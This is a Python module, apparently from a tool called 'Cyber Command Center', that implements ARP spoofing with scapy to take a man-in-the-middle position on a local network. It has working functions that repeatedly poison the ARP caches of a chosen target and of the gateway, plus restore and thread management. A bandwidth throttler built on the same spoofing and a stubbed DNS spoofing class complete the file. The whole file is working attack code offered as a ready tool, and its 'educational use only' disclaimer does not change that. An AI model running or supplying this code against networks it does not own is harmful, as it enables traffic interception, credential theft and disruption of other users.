"""
Cyber Command Center - ARP Spoofer
Module for ARP spoofing attacks (MITM) - FOR EDUCATIONAL USE ONLY ON YOUR OWN NETWORK
"""
import threading
import time
from typing import Optional

try:
    from scapy.all import ARP, Ether, send, srp, getmacbyip, conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class ARPSpoofer:
    """
    ARP Spoofing for Man-in-the-Middle attacks
    ONLY USE ON YOUR OWN NETWORK WITH PERMISSION
    """
    
    def __init__(self, interface: str = None):
        self.interface = interface
        self.targets = {}  # {target_ip: {'gateway_ip': ..., 'thread': ..., 'running': ...}}
        self.gateway_mac = None
        
        if SCAPY_AVAILABLE:
            conf.verb = 0
            if interface:
                conf.iface = interface
    
    def get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for an IP"""
        if not SCAPY_AVAILABLE:
            return None
        
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            answered, _ = srp(packet, timeout=2, verbose=False)
            
            if answered:
                return answered[0][1].hwsrc
        except Exception as e:
            print(f"Error getting MAC for {ip}: {e}")
        
        return None
    
    def spoof(self, target_ip: str, spoof_ip: str):
        """
        Send spoofed ARP packet
        Makes target think we are spoof_ip (usually the gateway)
        """
        if not SCAPY_AVAILABLE:
            raise Exception("Scapy not available. Install with: pip install scapy")
        
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            raise Exception(f"Could not get MAC address for {target_ip}")
        
        # Create ARP response (op=2) telling target that spoof_ip is at our MAC
        packet = ARP(
            op=2,                    # ARP reply
            pdst=target_ip,          # Target IP
            hwdst=target_mac,        # Target MAC
            psrc=spoof_ip            # We claim to be this IP (gateway)
        )
        
        send(packet, verbose=False)
    
    def restore(self, target_ip: str, gateway_ip: str):
        """
        Restore ARP tables to normal
        """
        if not SCAPY_AVAILABLE:
            return
        
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        
        if target_mac and gateway_mac:
            # Tell target the real gateway MAC
            packet = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=gateway_ip,
                hwsrc=gateway_mac
            )
            send(packet, count=5, verbose=False)
            
            # Tell gateway the real target MAC
            packet = ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=target_ip,
                hwsrc=target_mac
            )
            send(packet, count=5, verbose=False)
    
    def start_spoofing(self, target_ip: str, gateway_ip: str, interval: float = 1.0):
        """
        Start continuous ARP spoofing on a target
        """
        if target_ip in self.targets and self.targets[target_ip].get('running'):
            return False
        
        self.targets[target_ip] = {
            'gateway_ip': gateway_ip,
            'running': True,
            'packets_sent': 0
        }
        
        def spoof_loop():
            while self.targets[target_ip].get('running'):
                try:
                    # Spoof target (make them think we're the gateway)
                    self.spoof(target_ip, gateway_ip)
                    # Spoof gateway (make them think we're the target)
                    self.spoof(gateway_ip, target_ip)
                    self.targets[target_ip]['packets_sent'] += 2
                except Exception as e:
                    print(f"Spoof error: {e}")
                time.sleep(interval)
        
        thread = threading.Thread(target=spoof_loop)
        thread.daemon = True
        thread.start()
        self.targets[target_ip]['thread'] = thread
        
        return True
    
    def stop_spoofing(self, target_ip: str):
        """
        Stop spoofing and restore ARP tables
        """
        if target_ip not in self.targets:
            return False
        
        self.targets[target_ip]['running'] = False
        gateway_ip = self.targets[target_ip].get('gateway_ip')
        
        # Wait for thread to finish
        if self.targets[target_ip].get('thread'):
            self.targets[target_ip]['thread'].join(timeout=2)
        
        # Restore ARP tables
        if gateway_ip:
            print(f"Restoring ARP tables for {target_ip}...")
            self.restore(target_ip, gateway_ip)
        
        del self.targets[target_ip]
        return True
    
    def stop_all(self):
        """Stop all active spoofing"""
        targets = list(self.targets.keys())
        for target_ip in targets:
            self.stop_spoofing(target_ip)
    
    def get_active_targets(self):
        """Get list of active spoofing targets"""
        return [
            {
                'target_ip': ip,
                'gateway_ip': data.get('gateway_ip'),
                'packets_sent': data.get('packets_sent', 0),
                'running': data.get('running', False)
            }
            for ip, data in self.targets.items()
        ]
    
    def is_available(self):
        """Check if ARP spoofing is available"""
        return SCAPY_AVAILABLE


class BandwidthThrottler:
    """
    Throttle bandwidth for a target using ARP spoofing + traffic control
    """
    
    def __init__(self, interface: str = None):
        self.arp_spoofer = ARPSpoofer(interface)
        self.throttled_targets = {}
    
    def throttle(self, target_ip: str, gateway_ip: str, limit_kbps: int = 100):
        """
        Throttle a target's bandwidth
        Note: This requires additional setup for actual traffic control
        For now, we just enable ARP spoofing which allows traffic inspection
        """
        if not self.arp_spoofer.is_available():
            raise Exception("Scapy not available")
        
        # Start ARP spoofing
        self.arp_spoofer.start_spoofing(target_ip, gateway_ip)
        
        self.throttled_targets[target_ip] = {
            'gateway_ip': gateway_ip,
            'limit_kbps': limit_kbps,
            'active': True
        }
        
        # Note: Actual bandwidth limiting requires iptables/tc on Linux
        # or third-party tools on Windows. This sets up the MITM position.
        
        return True
    
    def unthrottle(self, target_ip: str):
        """Remove throttling from a target"""
        self.arp_spoofer.stop_spoofing(target_ip)
        if target_ip in self.throttled_targets:
            del self.throttled_targets[target_ip]
        return True
    
    def get_throttled_targets(self):
        """Get list of throttled targets"""
        return self.throttled_targets.copy()


class DNSSpoofer:
    """
    DNS Spoofing - Redirect domains to different IPs
    Requires ARP spoofing to be active first
    """
    
    def __init__(self):
        self.spoofed_domains = {}  # {domain: redirect_ip}
        self.is_running = False
        self._thread = None
    
    def add_rule(self, domain: str, redirect_ip: str):
        """Add a DNS spoofing rule"""
        self.spoofed_domains[domain.lower()] = redirect_ip
    
    def remove_rule(self, domain: str):
        """Remove a DNS spoofing rule"""
        domain = domain.lower()
        if domain in self.spoofed_domains:
            del self.spoofed_domains[domain]
    
    def get_rules(self):
        """Get all DNS spoofing rules"""
        return self.spoofed_domains.copy()
    
    def start(self):
        """
        Start DNS spoofing
        Note: This is a simplified implementation. Full DNS spoofing
        requires packet interception and modification.
        """
        if not SCAPY_AVAILABLE:
            raise Exception("Scapy not available")
        
        self.is_running = True
        
        # For a full implementation, you would:
        # 1. Sniff DNS queries
        # 2. If query matches a spoofed domain, send fake response
        # This requires running as administrator and proper packet handling
        
        return True
    
    def stop(self):
        """Stop DNS spoofing"""
        self.is_running = False


if __name__ == "__main__":
    print("ARP Spoofer module loaded")
    print(f"Scapy available: {SCAPY_AVAILABLE}")
    
    if SCAPY_AVAILABLE:
        spoofer = ARPSpoofer()
        print("ARP Spoofer initialized")
